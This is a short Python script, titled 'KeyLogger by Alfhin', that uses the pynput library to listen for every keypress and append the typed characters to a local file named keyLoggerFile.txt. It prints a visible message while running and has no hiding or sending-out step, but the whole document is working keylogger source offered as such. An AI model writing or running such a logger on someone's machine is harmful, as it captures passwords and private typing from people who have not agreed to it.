# KeyLogger by Alfhin
from pynput import keyboard

def keyPressed(key):
    print(f"Key pressed: {key}")

    with open("keyLoggerFile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting character. Please enter a character...")

if __name__ == '__main__':
    with keyboard.Listener(on_press=keyPressed) as listener:
        print("Keylogger is running. Press any key to log it.")
        listener.join()
